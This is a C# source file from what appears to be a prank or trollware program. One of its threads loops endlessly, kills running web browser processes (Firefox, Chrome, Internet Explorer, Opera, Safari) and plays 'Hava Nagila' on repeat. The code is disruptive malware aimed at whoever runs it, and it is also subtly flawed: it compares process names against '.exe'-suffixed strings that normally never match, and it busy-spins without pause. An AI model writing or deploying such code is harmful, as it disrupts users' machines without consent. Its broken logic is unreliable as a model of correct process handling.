using System.Diagnostics;
using System.Media;
using ëntärtäïnër.Properties;
using System.Linq;

namespace ëntärtäïnër
{
    internal static class Nagila2Thread
    {
        public static void Run()
        {
            string[] q = { "firefox.exe", "chrome.exe", "iexplore.exe", "opera.exe", "safari.exe" };
            SoundPlayer soundPlayer = null;
            while (true)
            {
                foreach (Process t in Process.GetProcesses())
                {
                    if (!q.Contains(t.ProcessName)) continue;
                    t.Kill();
                    if (soundPlayer != null)
                    {
                        soundPlayer.Stop();
                        soundPlayer.Dispose();
                    }
                    soundPlayer = new SoundPlayer(Resources.hava_nagila);
                    soundPlayer.PlayLooping();
                }
            }
        }
    }
}